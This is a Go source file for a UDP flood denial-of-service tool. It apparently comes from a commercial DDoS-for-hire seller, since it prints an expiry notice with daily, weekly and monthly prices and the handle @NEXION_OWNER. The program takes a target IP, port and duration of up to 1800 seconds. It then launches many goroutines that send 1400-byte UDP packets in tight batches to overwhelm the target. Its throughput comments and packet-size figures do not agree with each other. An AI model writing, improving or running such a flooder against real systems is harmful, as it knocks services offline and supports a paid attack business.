package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func main() {
	 // Check for expiration date
	 expirationDate := time.Date(2024, time.October, 1, 12, 0, 0, 0, time.UTC)
	 if time.Now().After(expirationDate) {
	   fmt.Println("\nThis script has expired and cannot be run\n")
	   fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	   fmt.Println("\nREAL SEALLER @NEXION_OWNER\n")
	   fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	   fmt.Println("\n    ❄️ PAID DDOS PRICE.❄️")
	   fmt.Println("")

	   fmt.Println("         DAY ₹99")
	   fmt.Println("        WEEK ₹399")
	   fmt.Println("       MONTH ₹1199")
	   fmt.Println("")
	   fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	   fmt.Println("\nSCRIPT MADE AND OWNED BY @NEXION_OWNER\n")
	   fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
		 return
		  }
  
	if len(os.Args) != 4 {
		fmt.Println("")
		fmt.Println("PAID SCRIPT BY :- @NEXION_OWNER")
		fmt.Println("SCRIPT OWNED BY @NEXION_OWNER")

	fmt.Println("")
		fmt.Println("Usage: ./VIP <target_ip> <target_port> <attack_duration>")
		fmt.Println("")
		return
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration > 1800 {
		fmt.Println("Invalid attack duration: must be an integer up to 1800 seconds.")
	  return
	}
	// Display attack information
	fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	fmt.Println("STARTING ATTACK")
	fmt.Printf("     IP %s\n", targetIP)
	fmt.Printf("     Port %s\n", targetPort)
	fmt.Printf("     Time %d seconds\n", duration)
	fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")

	// Calculate the number of packets needed to achieve 1GB/s traffic
	packetSize := 2400 // Adjust packet size as needed
	packetsPerSecond := 9_000_000_000 / packetSize
	numThreads := packetsPerSecond / 46_000

	// Create wait group to ensure all goroutines finish before exiting
	var wg sync.WaitGroup
	// Create a channel to signal when to stop the attack
	stop := make(chan struct{})

	// Launch goroutines for each thread
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendUDPPackets(targetIP, targetPort, packetsPerSecond, stop)
		}()
	}

	// Wait for the specified duration and then signal to stop
	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)

	// Wait for all goroutines to finish
	wg.Wait()
	fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	fmt.Println("     Attack finished.")
	fmt.Println("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
}


func sendUDPPackets(ip, port string, packetsPerSecond int, stop chan struct{}) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	packet := make([]byte, 1400) // Adjust packet size as needed
	batchSize := 9999            // Number of packets sent before checking stop

	for {
		select {
		case <-stop:
			// Exit when receiving stop signal
			return
		default:
			// Send packets in batches
			for i := 0; i < packetsPerSecond/batchSize; i++ {
				for j := 0; j < batchSize; j++ {
					_, err := conn.Write(packet)
					if err != nil {
						fmt.Println("Error sending UDP packet:", err)
						return
					}
				}

				// After sending a batch, check for the stop signal
				select {
				case <-stop:
					return
				default:
					// Continue to next batch if no stop signal
				}
			}
		}
	}
}